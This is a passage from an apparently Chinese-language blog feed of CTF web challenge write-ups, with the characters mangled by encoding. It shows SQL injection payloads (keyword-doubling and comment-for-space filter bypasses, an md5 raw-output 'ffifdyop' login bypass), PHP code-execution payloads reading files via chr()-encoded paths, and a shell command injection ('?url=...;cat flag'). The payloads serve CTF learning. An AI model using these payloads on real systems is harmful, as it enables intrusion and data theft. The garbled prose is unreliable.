â€˜geekâ€™`</p></blockquote><p>5&gt;æŸ¥è¡¨</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">11</span><span class="token string">' ununionion seselectlect 1,(seselectlect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='</span>geek'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">22</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿”å›ï¼š</p><blockquote><p>Hello b4bsql,geekuserï¼<br>Your password is â€˜geekâ€™</p></blockquote><p>6&gt;æŸ¥å­—æ®µ</p><pre class="line-numbers language-none"><code class="language-none">11&#39; ununionion seselectlect 1,(seselectlect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;b4bsql&#39;),database()%23&amp;password&#x3D;22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>è¿”å›</p><p><code>Hello id,username,passwordï¼</code></p><p><code>Your password is &#39;geek&#39;</code></p></blockquote><p>7&gt;æŸ¥å€¼</p><pre class="line-numbers language-none"><code class="language-none">11&#39; ununionion seselectlect 1,(seselectlect group_concat(id,username,passwoorrd) frofromm b4bsql),database()%23&amp;password&#x3D;22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>è¿”å›ï¼š</p><p><code>flag&#123;fdbfc75c-253c-482b-8867-dfd6f0dd92e6&#125;ï¼</code></p></blockquote><h2 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><blockquote><p>åˆ¤æ–­æ³¨å…¥ç‚¹åï¼Œå¸¸è§„æŸ¥è¯¢ï¼Œå‘ç°éƒ¨åˆ†å…³é”®å­—è¢«ç»•è¿‡</p></blockquote><h1 id="14ã€-RoarCTF-2019-Easy-Calc"><a href="#14ã€-RoarCTF-2019-Easy-Calc" class="headerlink" title="14ã€[RoarCTF 2019]Easy Calc"></a>14ã€[RoarCTF 2019]Easy Calc</h1><blockquote><p>æ²¡æœ‰æ€è·¯</p></blockquote><p>æŸ¥è¯¢äº†è§£åˆ°æœ‰ä¸¤ä¸ªæ–¹æ³•</p><blockquote><ol><li>åˆ©ç”¨phpå¯¹å­—ç¬¦ä¸²çš„å¤„ç†ç‰¹æ€§ç»•è¿‡waf</li><li>Httpèµ°ç§</li></ol></blockquote><h2 id="æ³•1"><a href="#æ³•1" class="headerlink" title="æ³•1"></a>æ³•1</h2><blockquote><p>è¿›è¡Œç»•wafï¼Œé¦–å…ˆäº†è§£ä¸€ä¸‹phpçš„è§£æè§„åˆ™ï¼Œå½“phpè¿›è¡Œè§£æçš„æ—¶å€™ï¼Œå¦‚æœå˜é‡å‰é¢æœ‰ç©ºæ ¼ï¼Œä¼šå»æ‰å‰é¢çš„ç©ºæ ¼å†è§£æï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹ç»•è¿‡wafã€‚</p></blockquote><blockquote><blockquote><p>æ„é€ payloadæ¥æŸ¥çœ‹ç›®å½•ï¼Œç”¨chrè½¬åŒ–æˆascllç è¿›è¡Œç»•è¿‡</p></blockquote></blockquote><p>payload1ï¼š</p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">? num</span><span class="token punctuation">=</span><span class="token value attr-value">1;var_dump(scandir(chr(47)))</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><code>1array(24) &#123;  [0]=&gt;  string(1) &quot;.&quot;  [1]=&gt;  string(2) &quot;..&quot;  [2]=&gt;  string(10) &quot;.dockerenv&quot;  [3]=&gt;  string(3) &quot;bin&quot;  [4]=&gt;  string(4) &quot;boot&quot;  [5]=&gt;  string(3) &quot;dev&quot;  [6]=&gt;  string(3) &quot;etc&quot;  [7]=&gt;  string(5) &quot;f1agg&quot;  [8]=&gt;  string(4) &quot;home&quot;  [9]=&gt;  string(3) &quot;lib&quot;  [10]=&gt;  string(5) &quot;lib64&quot;  [11]=&gt;  string(5) &quot;media&quot;  [12]=&gt;  string(3) &quot;mnt&quot;  [13]=&gt;  string(3) &quot;opt&quot;  [14]=&gt;  string(4) &quot;proc&quot;  [15]=&gt;  string(4) &quot;root&quot;  [16]=&gt;  string(3) &quot;run&quot;  [17]=&gt;  string(4) &quot;sbin&quot;  [18]=&gt;  string(3) &quot;srv&quot;  [19]=&gt;  string(8) &quot;start.sh&quot;  [20]=&gt;  string(3) &quot;sys&quot;  [21]=&gt;  string(3) &quot;tmp&quot;  [22]=&gt;  string(3) &quot;usr&quot;  [23]=&gt;  string(3) &quot;var&quot; &#125;</code></p></blockquote><p>payload2ï¼šæŸ¥çœ‹flagå†…å®¹</p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">? num</span><span class="token punctuation">=</span><span class="token value attr-value">1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><code>1string(43) &quot;flag&#123;5392e731-b3c2-45d6-9326-976c11b3c2b0&#125; &quot;</code></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="https://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>ctf.show_web9</title>
    <link href="https://kannikanyun.github.io/2022/04/14/ctf.show_web9/"/>
    <id>https://kannikanyun.github.io/2022/04/14/ctf.show_web9/</id>
    <published>2022-04-14T13:52:23.000Z</published>
    <updated>2022-04-14T14:16:45.821Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><blockquote><p> ç™»å½•ç•Œé¢ï¼Œæƒ³åˆ°äº†sqlæ³¨å…¥ï¼Œè¯•ä¸€ä¸‹ä¸‡èƒ½å¯†ç ï¼Œä¸è¡Œ</p></blockquote></blockquote><p>`çŒœæµ‹å¯èƒ½æœ‰å…¶ä»–é¡µé¢</p><p>æ³•ä¸€ï¼š</p><blockquote><p><strong>ç›´æ¥åå°ç›®å½•æ‰«æï¼Œå‘ç°index.phpsæºä»£ç æ–‡ä»¶</strong></p></blockquote><p>æ³•äºŒï¼š</p><blockquote><p>robots.txtä¸­æŸ¥çœ‹è¢«éšè—ä¸å…è®¸è®¿é—®çš„é¡µé¢</p><pre class="line-numbers language-none"><code class="language-none">User-agent: *Disallow: &#x2F;index.phps<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h2 id="index-phpsä»£ç "><a href="#index-phpsä»£ç " class="headerlink" title="index.phpsä»£ç "></a>index.phpsä»£ç </h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>        <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"password error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from user where username ='admin' and password ='"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ç™»é™†æˆåŠŸ&lt;br>"</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å…³é”®ä»£ç è§£é‡Šï¼š"><a href="#å…³é”®ä»£ç è§£é‡Šï¼š" class="headerlink" title="å…³é”®ä»£ç è§£é‡Šï¼š"></a>å…³é”®ä»£ç è§£é‡Šï¼š</h2><blockquote><ol><li><p>  PHP strlen() å‡½æ•°ï¼šå‡½æ•°è¿”å›å­—ç¬¦ä¸² â€œShanghaiâ€ çš„é•¿åº¦ï¼›</p></li><li><p>mysqli_query() å‡½æ•°æ‰§è¡ŒæŸä¸ªé’ˆå¯¹æ•°æ®åº“çš„æŸ¥è¯¢&lt;æŸ¥è¯¢æˆåŠŸå°†è¿”å›ä¸€ä¸ª mysqli_result å¯¹è±¡æˆ– TRUEã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› FALSE&gt;</p></li><li><p>md5() å‡½æ•°è®¡ç®—å­—ç¬¦ä¸²çš„ MD5 æ•£åˆ—â€”â€“&gt; <center><u>md5(<em>string,raw</em>)<u/><center/></p></li><li><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦è®¡ç®—çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>raw</em></td><td align="left">å¯é€‰ã€‚è§„å®šåå…­è¿›åˆ¶æˆ–äºŒè¿›åˆ¶è¾“å‡ºæ ¼å¼ï¼šTRUE - åŸå§‹ 16 å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼FALSE - é»˜è®¤ã€‚32 å­—ç¬¦åå…­è¿›åˆ¶æ•°</td></tr></tbody></table></li><li><p>PHP mysqli_num_rows()ï¼šè·å–æŸ¥è¯¢ç»“æœçš„è¡Œæ•°</p></li><li><p>mysqli_fetch_assoc() å‡½æ•°ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºå…³è”æ•°ç»„<br> ==å¾—å‡ºç»“è®ºï¼š==<br> è¦å¾—åˆ°flagéœ€è¦å‘passwordä¼ å‚ï¼Œå¹¶ä¸”ä¼ å‚ç»“æœéœ€è¦ç»è¿‡md5åŠ å¯†åé€šè¿‡sqlè¯­å¥éªŒè¯ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥ç†è§£ä¸ºä½¿ç”¨md5è¿›è¡Œç»•è¿‡</p></li></ol></blockquote><h1 id="php-md5-æ¼æ´"><a href="#php-md5-æ¼æ´" class="headerlink" title="php md5()æ¼æ´"></a>php md5()æ¼æ´</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"> è¿™é‡Œæ¶‰åŠåˆ°äº†ä¸€ä¸ª<span class="token constant">PHP</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">)</span>æ¼æ´å³ï¼šphpä¸­çš„md5å‡½æ•°æœ‰ä¸€ä¸ªå¯é€‰å‚æ•°ï¼Œå¦‚æœå¼€å‘è€…å†™æŸ¥è¯¢æ•°æ®åº“å‡½æ•°æ—¶ä½¿ç”¨äº†è¿™ä¸ªå‚æ•°ï¼Œæˆ–è€…åœ¨æ•°æ®å­˜å‚¨æ—¶æ˜¯md5åçš„å­—ç¬¦ä¸²å½¢å¼å­˜å‚¨ï¼Œéƒ½æœ‰å¯èƒ½äº§ç”Ÿè¿™ä¸ªæ¼æ´<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><h2 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h2><pre class="line-numbers language-none"><code class="language-none">md5(string,raw)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦è®¡ç®—çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>raw</em></td><td align="left">å¯é€‰ã€‚è§„å®šåå…­è¿›åˆ¶æˆ–äºŒè¿›åˆ¶è¾“å‡ºæ ¼å¼ï¼šTRUE - åŸå§‹ 16 å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼FALSE - é»˜è®¤ã€‚32 å­—ç¬¦åå…­è¿›åˆ¶æ•°</td></tr></tbody></table></blockquote><p>md5çœ‹ä¼¼æ˜¯éå¸¸å¼º<a href="https://so.csdn.net/so/search?q=%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">åŠ å¯†</a>æªæ–½ï¼Œä½†æ˜¯ä¸€æ—¦æ²¡æœ‰è¿”å›æˆ‘ä»¬å¸¸è§çš„16è¿›åˆ¶æ•°ï¼Œè¿”å›äº†äºŒè¿›åˆ¶åŸå§‹è¾“å‡ºæ ¼å¼ï¼Œåœ¨æµè§ˆå™¨ç¼–ç çš„ä½œç”¨ä¸‹å°±ä¼šç¼–ç æˆä¸ºå¥‡æ€ªçš„å­—ç¬¦ä¸²ï¼ˆå¯¹äºäºŒè¿›åˆ¶ä¸€èˆ¬éƒ½ä¼šç¼–ç ï¼‰ã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨md5ç¢°æ’ï¼Œä¸€æ—¦åœ¨è¿™äº›å¥‡æ€ªçš„<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">å­—ç¬¦ä¸²</a>ä¸­ç¢°æ’å‡ºäº†å¯ä»¥è¿›è¡ŒSQLæ³¨å…¥çš„ç‰¹æ®Šå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¶Šè¿‡ç™»å½•äº†</p><p>åœ¨ç»è¿‡é•¿æ—¶é—´çš„ç¢°æ’åï¼Œæ¯”è¾ƒå¸¸ç”¨çš„æ˜¯ä»¥ä¸‹ä¸¤ç§ï¼š<br>æ•°å­—å‹ï¼š<code>129581926211651571912466741651878684928</code><br>å­—ç¬¦å‹ï¼š<code>ffifdyop</code></p><blockquote><p>å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç éªŒè¯ï¼š</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'ffifdyop'</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'129581926211651571912466741651878684928'</span><span class="token punctuation">;</span>    <span class="token variable">$bb</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$bb</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>    <span class="token variable">$cc</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$cc</span>    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»“æœä¸ºï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'or'</span><span class="token number">6</span>ï¿½<span class="token punctuation">]</span>ï¿½ï¿½<span class="token operator">!</span>r<span class="token punctuation">,</span>ï¿½ï¿½bï¿½<span class="token constant">T0D</span>ï¿½ï¿½o<span class="token comment">#ï¿½ï¿½'or'8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œå®ƒä»¬éƒ½æœ‰==<strong>â€˜orâ€™</strong>==ç»“æ„<br>å°±å¯ä»¥æ„é€ å‡º**<u>å¿…çœŸ</u>**çš„ç»“æœã€‚</p><h1 id="æœ€ç»ˆç»“æœï¼š"><a href="#æœ€ç»ˆç»“æœï¼š" class="headerlink" title="æœ€ç»ˆç»“æœï¼š"></a>æœ€ç»ˆç»“æœï¼š</h1><p><code>strlen($password)&gt;10</code>è¦æ±‚å­—ç¬¦ä¸²é•¿åº¦å°äº10ï¼Œå› æ­¤é€‰æ‹©<code>ffifdyop</code></p><p>ä½¿ç”¨bpè¿›è¡ŒæŠ“åŒ…æ”¹åŒ…ï¼Œå‘passwordä¼ å‚</p><p>å¾—åˆ°flag</p><p><a href="%5B(68%E6%9D%A1%E6%B6%88%E6%81%AF">æ€»ç»“ctfä¸­ MD5 ç»•è¿‡çš„ä¸€äº›æ€è·¯</a> æ€»ç»“ctfä¸­ MD5 ç»•è¿‡çš„ä¸€äº›æ€è·¯_yà¸ˆà¸¸à¹Šà¸šngçš„åšå®¢-CSDNåšå®¢_ctf md5ç»•è¿‡](<a href="https://blog.csdn.net/CSDNiamcoming/article/details/108837347">https://blog.csdn.net/CSDNiamcoming/article/details/108837347</a>))</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="https://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow_web_èŒæ–°èµ›ç­¾åˆ°é¢˜</title>
    <link href="https://kannikanyun.github.io/2022/04/14/ctfshow_web_%E8%90%8C%E6%96%B0%E8%B5%9B%E7%AD%BE%E5%88%B0%E9%A2%98/"/>
    <id>https://kannikanyun.github.io/2022/04/14/ctfshow_web_%E8%90%8C%E6%96%B0%E8%B5%9B%E7%AD%BE%E5%88%B0%E9%A2%98/</id>
    <published>2022-04-14T11:52:23.000Z</published>
    <updated>2022-04-14T14:17:32.128Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="é¢˜ç›®ï¼š"><a href="#é¢˜ç›®ï¼š" class="headerlink" title="é¢˜ç›®ï¼š"></a>é¢˜ç›®ï¼š</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"curl https://"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">".ctf.show"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹å¾—å‡ºå…³é”®å¤„æ˜¯==system()==ä¸­çš„å†…å®¹ï¼Œæ­¤å¤„å»äº†è§£ä¸‹</p><h1 id="PHP-å‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#PHP-å‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="PHP å‘½ä»¤æ‰§è¡Œæ¼æ´"></a>PHP å‘½ä»¤æ‰§è¡Œæ¼æ´</h1><blockquote><p>åº”ç”¨ç¨‹åºæœ‰æ—¶éœ€è¦è°ƒç”¨ä¸€äº›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°,å¦‚åœ¨PHPä¸­ï¼Œä½¿ç”¨systemã€execã€shell_execã€passthruã€popenã€proc_popenç­‰å‡½æ•°å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><p>å½“é»‘å®¢èƒ½æ§åˆ¶è¿™äº›å‡½æ•°ä¸­çš„å‚æ•°æ—¶ï¼Œå°±å¯ä»¥å°†æ¶æ„çš„ç³»ç»Ÿå‘½ä»¤æ‹¼æ¥åˆ°æ­£å¸¸å‘½ä»¤ä¸­ï¼Œä»è€Œé€ æˆå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œè¿™å°±æ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p></blockquote><p><a href="%5B(68%E6%9D%A1%E6%B6%88%E6%81%AF">PHPçš„å‘½ä»¤æ‰§è¡Œæ¼æ´å­¦ä¹ </a> PHPçš„å‘½ä»¤æ‰§è¡Œæ¼æ´å­¦ä¹ _ç¬‘èŠ±å¤§ç‹çš„åšå®¢-CSDNåšå®¢](<a href="https://blog.csdn.net/weixin_43818995/article/details/104164684))%EF%BC%9A%EF%BC%88win%E4%B8%8Elinux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E7%AE%A1%E9%81%93%E7%AC%A6%E7%9A%84%E5%8A%9F%E8%83%BD%EF%BC%89">https://blog.csdn.net/weixin_43818995/article/details/104164684))ï¼šï¼ˆwinä¸linuxç³»ç»Ÿä¸‹ç®¡é“ç¬¦çš„åŠŸèƒ½ï¼‰</a></p><p>[ctfwebå‘½ä»¤æ‰§è¡Œ](<a href="https://www.cnblogs.com/NPFS/p/13797436.html">CTFshow webå…¥é—¨ (å‘½ä»¤æ‰§è¡Œï¼‰ - NPFS - åšå®¢å›­ (cnblogs.com)</a>)</p><blockquote><p>systemè§£é‡Šï¼š</p><p>phpå‡½æ•°systemè¯¦è§£ï¼š æ‰§è¡Œå¤–éƒ¨ç¨‹åºå¹¶æ˜¾ç¤ºè¾“å‡ºèµ„æ–™ã€‚ systemè¯­æ³•: string system(string command, int [return_var]); systemè¿”å›å€¼: å­—ç¬¦ä¸² å‡½æ•°ç§ç±»: æ“ä½œç³»ç»Ÿä¸ç¯å¢ƒ systemå†…å®¹è¯´æ˜ æœ¬å‡½æ•°å°±åƒæ˜¯ C è¯­ä¸­çš„å‡½æ•° system()ï¼Œç”¨æ¥æ‰§è¡ŒæŒ‡ä»¤ï¼Œå¹¶è¾“å‡ºç»“æœã€‚</p></blockquote><h1 id="æ„é€ payload"><a href="#æ„é€ payload" class="headerlink" title="æ„é€ payload"></a>æ„é€ payload</h1><p><strong>æœ‰ä¸¤ç§æ–¹å¼</strong>ï¼ˆlinuxä¸‹urlå‘½ä»¤ä¼ å‚ï¼‰</p><p>ä¸€ï¼š</p><pre class="line-numbers language-none"><code class="language-none">?url&#x3D;127.0.0.1;cat flag;è¯¥å‘½ä»¤ç›´æ¥çŒœæµ‹æŸ¥çœ‹flagæ–‡ä»¶<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>äºŒï¼š</p><pre class="line-numbers language-none"><code class="language-none">?url&#x3D;ff5cc03e-74f6-4b21-aedd-b7365f36e520;ls;è¯¥å‘½ä»¤æ˜¾ç¤ºç»“æœä¸ºï¼š<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>flag index.php </p></blockquote><p>ç»§ç»­è®¿é—®flagæ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">?url&#x3D;ff5cc03e-74f6-4b21-aedd-b7365f36e520;cat flag;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¾—åˆ°flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="https://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>ctfShow7_8</title>
    <link href="https://kannikanyun.github.io/2022/04/08/ctfShow-web-7-8/"/>
    <id>https://kannikanyun.github.io/2022/04/08/ctfShow-web-7-8/</id>
    <published>2022-04-08T09:04:17.000Z</published>
    <updated>2022-04-08T09:30:24.735Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ctf-show-web7"><a href="#ctf-show-web7" class="headerlink" title="ctf.show_web7"></a>ctf.show_web7</h1><blockquote><p>ç‚¹å¼€é¢˜ç›®ä¸­åˆ—è¡¨ï¼Œæ²¡æœ‰å‘ç°æœ‰ä»·å€¼çš„ä¿¡æ¯</p><p>ä½†æ˜¯URLä¸­å‡ºç°äº†**<u>?id=</u>**å­—æ ·ï¼Œå¯èƒ½æ˜¯sqlæ³¨å…¥</p></blockquote><p><code>http://579975c2-c8b2-48a7-955a-efc4b38455a6.challenge.ctf.show/?id=1</code></p><h2 id="ç®€å•åˆ¤æ–­æœ‰æ— æ³¨å…¥ç‚¹"><a href="#ç®€å•åˆ¤æ–­æœ‰æ— æ³¨å…¥ç‚¹" class="headerlink" title="ç®€å•åˆ¤æ–­æœ‰æ— æ³¨å…¥ç‚¹"></a>ç®€å•åˆ¤æ–­æœ‰æ— æ³¨å…¥ç‚¹</h2><p><code>id=1&#39;</code> å•å¼•å·åˆ¤æ–­ï¼ˆå¯èƒ½å› ä¸ºå•å¼•å·ä¸åŒ¹é…è€ŒæŠ¥é”™ï¼‰</p><blockquote><p>/index.php?id=1â€™ #</p><p>ä¸æŠ¥é”™</p></blockquote><h2 id="å°è¯•åå‘ç°-ç©ºæ ¼-è¢«è¿‡æ»¤"><a href="#å°è¯•åå‘ç°-ç©ºæ ¼-è¢«è¿‡æ»¤" class="headerlink" title="å°è¯•åå‘ç°==ç©ºæ ¼==è¢«è¿‡æ»¤"></a>å°è¯•åå‘ç°==ç©ºæ ¼==è¢«è¿‡æ»¤</h2><p>ä½¿ç”¨==//==æˆ–==/**/==ç»•è¿‡è¿‡æ»¤</p><table><thead><tr><th align="left">çˆ†æ˜¾ç¤ºä½</th><th>?id=1%27/<strong>/or/</strong>/1=1/<strong>/union/</strong>/select/**/1,2,3#</th></tr></thead><tbody><tr><td align="left">çˆ†è¡¨</td><td>ï¼Ÿid=1/<strong>/union/</strong>/select/<strong>/1,group_concat(table_name),3/</strong>/from/<strong>/information_schema.tables/</strong>/where/**/table_schema=database()#</td></tr><tr><td align="left">çˆ†å­—æ®µ</td><td>?id=-1/<strong>/union/</strong>/select/<strong>/1,group_concat(column_name),3/</strong>/from/<strong>/information_schema.columns/</strong>/where/**/table_name=â€flagâ€#</td></tr><tr><td align="left">çˆ†å€¼</td><td>?id=-1/<strong>/union/</strong>/select/<strong>/1,flag,3/</strong>/from/**/flag#</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="https://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>sqlæ³¨å…¥ç‚¹åˆ¤æ–­</title>
    <link href="https://kannikanyun.github.io/2022/04/05/sql%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A4%E6%96%AD/"/>
